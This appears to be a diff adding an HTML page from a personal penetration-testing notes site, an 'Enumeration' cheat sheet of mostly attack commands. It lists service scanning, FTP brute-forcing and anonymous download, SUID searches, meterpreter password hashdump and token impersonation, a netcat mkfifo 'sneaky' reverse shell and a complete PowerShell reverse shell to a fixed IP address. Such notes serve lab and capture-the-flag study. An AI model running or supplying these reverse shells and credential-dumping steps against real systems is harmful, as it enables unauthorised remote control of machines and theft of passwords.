@@ -1,0 +1,639 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../bufferoverflow/">
+      
+      
+        <link rel="next" href="../kali/">
+      
+      <link rel="icon" href="../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.4.2, mkdocs-material-9.1.6">
+    
+    
+      
+        <title>Enumeration - d34dp1x3l's Notes</title>
+      
+    
+    
+      <link rel="stylesheet" href="../assets/stylesheets/main.ded33207.min.css">
+      
+        
+        <link rel="stylesheet" href="../assets/stylesheets/palette.a0c5b2b5.min.css">
+      
+      
+
+    
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="" data-md-color-accent="">
+  
+    
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#enumeration" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href=".." title="d34dp1x3l&#39;s Notes" class="md-header__button md-logo" aria-label="d34dp1x3l's Notes" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            d34dp1x3l's Notes
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Enumeration
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href=".." title="d34dp1x3l&#39;s Notes" class="md-nav__button md-logo" aria-label="d34dp1x3l's Notes" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    d34dp1x3l's Notes
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href=".." class="md-nav__link">
+        WELCOME!
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../bufferoverflow/" class="md-nav__link">
+        CHEATSHEET
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          Enumeration
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        Enumeration
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#table-of-contents" class="md-nav__link">
+    Table of Contents
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../kali/" class="md-nav__link">
+        Kali
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../metasploit/" class="md-nav__link">
+        Metasploit
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../terminal/" class="md-nav__link">
+        Terminal
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="0">
+          Exploitation
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_7">
+          <span class="md-nav__icon md-icon"></span>
+          Exploitation
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../exploitation/passwords/" class="md-nav__link">
+        Cracking Passwords
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../exploitation/reverse_shells/" class="md-nav__link">
+        Reverse Shells
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_8" id="__nav_8_label" tabindex="0">
+          Privesc
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_8">
+          <span class="md-nav__icon md-icon"></span>
+          Privesc
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../privesc/linux/" class="md-nav__link">
+        Linux Priv Esc
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../privesc/windows/" class="md-nav__link">
+        Windows Priv Esc
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#table-of-contents" class="md-nav__link">
+    Table of Contents
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+<h1 id="enumeration">Enumeration</h1>
+<p>Documenting different ways to uncover ways to gain intial access and exploiting them.</p>
+<h2 id="table-of-contents">Table of Contents</h2>
+<ul>
+<li><a href="#NMAP">NMAP</a></li>
+<li><a href="#SMB">SMB</a></li>
+<li><a href="#FTP">FTP</a></li>
+<li><a href="#HTTP">HTTP</a></li>
+</ul>
+<hr />
+<h1 id="nmap">NMAP</h1>
+<p>As an alternative you can use <code>rustscan -a &lt;address&gt;</code></p>
+<p>Normal scan: <code>nmap -vv -sV -Pn -A -T4 --script vuln &lt;address&gt;</code>
+Long scan: <code>nmap -sV -Pn -A -T4 -p- &lt;address&gt;</code></p>
+<hr />
+<h1 id="smb">SMB</h1>
+<h2 id="initial-access">Initial Access</h2>
+<p><code>smbmap -H &lt;address&gt;</code>
+Check discovered directories in other places such as websites.
+<code>smbclient -L &lt;address&gt; -U</code>
+List all the directories in the share
+Enumerate SMB via NMAP: <code>nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse &lt;address&gt;</code></p>
+<hr />
+<h1 id="ftp">FTP</h1>
+<h2 id="initial-access_1">Initial Access</h2>
+<h3 id="anonymous-login">Anonymous Login</h3>
+<p><code>ftp &lt;address&gt;</code>
+login: anonymous (no password required)</p>
+<h3 id="nmap-scripts">NMAP Scripts</h3>
+<p><code>nmap --script ftp-* -p 21 &lt;address&gt;</code></p>
+<h2 id="brute-force">Brute Force</h2>
+<p><a href="https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt">ftp-betterdefaultpasslist</a></p>
+<h2 id="investigation">Investigation</h2>
+<h3 id="download-all-files">Download all files</h3>
+<p><code>wget -m ftp://anonymous:anonymous@&lt;address&gt;</code>
+<code>wget -m --no-passive ftp://anonymous:anonymous@&lt;address&gt;</code></p>
+<hr />
+<h1 id="http">HTTP</h1>
+<h2 id="initial-access_2">Initial Access</h2>
+<h3 id="directory-discovery">Directory Discovery</h3>
+<p>GoBuster: <code>gobuster dirb --url=&lt;address&gt; --wordlist=&lt;wordlist&gt;</code>
+After running go buster manually explore some interesting directories, such as robots.txt.</p>
+<h3 id="password-discovery">Password Discovery</h3>
+<p>If you are having trouble brute-forcing a password for a blog, try creating a custom wordlist with cewl:
+<code>cewl -d 3 -m 7 -w &lt;wordlist to export&gt; &lt;http://address.com&gt;</code></p>
+<h3 id="reverse-shells">Reverse Shells</h3>
+<p>See <a href="/exploitation/reverse_shells">Reverse Shells</a> for more information.</p>
+<hr />
+<h2 id="post-exploitation">Post-Exploitation</h2>
+<h3 id="check-services-and-ports">Check Services and Ports</h3>
+<p>Running Ports: <code>ss -natu</code>
+    <code>netstat -tulpn | grep LISTEN</code>
+Forwarding ports through ssh: <code>ssh -L &lt;local port&gt;:&lt;remote address&gt;:&lt;remote port&gt; &lt;username&gt;@&lt;address&gt;</code></p>
+<h3 id="python">Python</h3>
+<h4 id="reverse-shell-upgrade">Reverse Shell Upgrade</h4>
+<p><code>python -c 'import pty; pty.spawn("/bin/bash")'</code></p>
+<h4 id="simple-http-server">Simple HTTP Server</h4>
+<p>If you need to get a file over to a compromised server with curl installed:
+<code>python3 -m http.server</code></p>
+<h3 id="shell">Shell</h3>
+<h4 id="suid-search">SUID search</h4>
+<p><code>find / -user root -perm -4000 -exec ls -ldb {} \;</code>
+<code>find / -perm -u=s -type f 2&gt;/dev/null</code>
+BEST: <code>find / -perm -u=s -type f 2&gt;/dev/null; find / -perm -4000 -o- -perm -2000 -o- -perm -6000 2&gt;/dev/null</code></p>
+<p>If you find a binary that matches this, you can try running with the <code>-p</code> flag which allows you to run a binary as the owner.</p>
+<p>EXAMPLE USES:
+nmap -i
+find <folder> -exec <command> \;</p>
+<h2 id="sneaky-reverse-shell-bash">Sneaky Reverse Shell Bash</h2>
+<pre><code class="language-bash">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 127.0.0.1 4444 &gt;/tmp/f
+</code></pre>
+<h4 id="find-writable-directories">Find writable directories</h4>
+<p><code>find -type d -writable</code></p>
+<h4 id="windows-migration">Windows Migration</h4>
+<p>get a meterpreter session and find a process running as SYSTEM: <code>ps</code>
+safest choice is to choose <code>services.exe</code>
+<code>migrate &lt;process id&gt;</code></p>
+<h4 id="windows-passwords">Windows Passwords</h4>
+<p>within meterpreter session: <code>hashdump</code></p>
+<h4 id="using-powershell">Using Powershell</h4>
+<p><code>load powershell</code> then <code>powershell_shell</code></p>
+<h4 id="windows-token-exploitation">Windows Token Exploitation</h4>
+<p>powershell <code>whoami /priv</code>
+msf <code>load incognito</code>
+<code>list_tokens -g</code> then <code>impersonate_token &lt;name of token&gt;</code></p>
+<h2 id="tools">Tools</h2>
+<p>A series of a userful links:
+- <a href="https://github.com/samratashok/nishang.git">Nishang</a>: A series of useful Windows Exploit scripts
+- <a href="https://github.com/PowerShellMafia/PowerSploit">PowerSploit</a> Same as above</p>
+<h3 id="powershell-reverse-shell">Powershell Reverse Shell</h3>
+<p><code>powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.8.219.14',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"</code></p>
+<h3 id="starting-smb-server">Starting SMB Server</h3>
+<p>Navigate to folder to share</p>
+<p><code>python3 /usr/share/doc/impacket-scripts/examples/smbserver.py SHARE .</code></p>
+<h3 id="starting-ftp-server">Starting FTP Server</h3>
+<p>Install <code>sudo apt-get install python3-pyftpdlib</code></p>
+<p><code>python3 -m pyftpdlib -p 21</code></p>
+<p>Pull everything in a folder:
+`wget -mbr --username="anonymous" --password="" "ftp://<address>/<folder>/*"</p>
+<h3 id="powershell">Powershell</h3>
+<ul>
+<li>Search for command with name: <code>Get-Command *search_parameter*</code></li>
+<li>Get all Parameters for a command: <code>(Get-Command Command).Parameters</code></li>
+<li>Search for a file: <code>Get-ChildItem -Path C:\ -Include *title* -File -Recurse -ErrorAction SilentlyContinue</code></li>
+<li>Search for files containing string: <code>Get-ChildItem C:\* -Recurse | Select-String -pattern search_string</code></li>
+<li>Get list of running processes: <code>Get-Process</code></li>
+</ul>
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    <script id="__config" type="application/json">{"base": "..", "features": [], "search": "../assets/javascripts/workers/search.208ed371.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    
+    
+      <script src="../assets/javascripts/bundle.51198bba.min.js"></script>
+      
+    
+  </body>
+</html>
